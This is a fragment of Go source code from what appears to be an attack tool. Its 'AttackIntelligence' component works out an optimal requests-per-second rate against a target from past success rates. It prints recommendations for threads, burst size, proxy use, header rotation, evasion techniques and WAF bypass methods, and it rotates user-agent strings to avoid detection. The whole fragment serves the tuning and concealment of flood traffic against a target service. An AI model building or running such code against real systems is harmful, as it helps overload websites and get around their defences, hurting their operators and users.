		if lp.SuccessRate > 0.65 && lp.RPS > optimalRPS {
			optimalRPS = lp.RPS
		}
	}

	// If nothing found, use conservative estimate
	if optimalRPS == 0 {
		// Find average RPS with success > 50%
		var sum, count float64
		for _, lp := range patterns {
			if lp.SuccessRate > 0.5 {
				sum += lp.RPS
				count++
			}
		}
		if count > 0 {
			optimalRPS = sum / count * 0.8 // 80% of average
		} else {
			optimalRPS = 50
		}
	}

	ai.targetProfile.OptimalRPS = int(optimalRPS)
	return int(optimalRPS)
}

// PrintRecommendations displays current ML recommendations
func (ai *AttackIntelligence) PrintRecommendations() {
	ai.mutex.RLock()
	defer ai.mutex.RUnlock()

	rec := ai.recommendations
	profile := ai.targetProfile

	color.Cyan("\n┌─────────────────────────────────────────────────────────────────┐")
	color.Cyan("│                   🤖 ML RECOMMENDATIONS                         │")
	color.Cyan("├─────────────────────────────────────────────────────────────────┤")
	fmt.Printf("│ %-20s %-43d │\n", "Recommended RPS:", rec.RPS)
	fmt.Printf("│ %-20s %-43d │\n", "Recommended Threads:", rec.Threads)
	fmt.Printf("│ %-20s %-43s │\n", "Delay Between:", rec.DelayBetween)
	fmt.Printf("│ %-20s %-43d │\n", "Burst Size:", rec.BurstSize)
	fmt.Printf("│ %-20s %-43v │\n", "Use Proxy:", rec.UseProxy)
	fmt.Printf("│ %-20s %-43v │\n", "Rotate Headers:", rec.HeaderRotation)

	color.Cyan("├─────────────────────────────────────────────────────────────────┤")
	fmt.Printf("│ %-20s %-43.1f%% │\n", "Predicted Success:", rec.PredictedSuccess*100)
	fmt.Printf("│ %-20s %-43.1f%% │\n", "Confidence:", rec.Confidence*100)
	fmt.Printf("│ %-20s %-43s │\n", "Reasoning:", truncateStr(rec.Reasoning, 43))

	if len(rec.EvasionTechniques) > 0 {
		color.Cyan("├─────────────────────────────────────────────────────────────────┤")
		color.Yellow("│ Evasion Techniques:                                             │")
		for _, technique := range rec.EvasionTechniques {
			fmt.Printf("│   • %-59s │\n", technique)
		}
	}

	if len(rec.WAFBypassMethods) > 0 {
		color.Cyan("├─────────────────────────────────────────────────────────────────┤")
		color.Red("│ WAF Bypass Methods (%s):                                │\n", profile.WAFType)
		for _, method := range rec.WAFBypassMethods {
			fmt.Printf("│   • %-59s │\n", method)
		}
	}

	color.Cyan("└─────────────────────────────────────────────────────────────────┘")
}

// Helper functions
func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func randInt(n int) int {
	if n <= 0 {
		return 0
	}
	return int(time.Now().UnixNano() % int64(n))
}

func randFloat() float64 {
	return float64(time.Now().UnixNano()%10000) / 10000.0
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
}

func getRandomUserAgent() string {
	return userAgents[randInt(len(userAgents))]
}
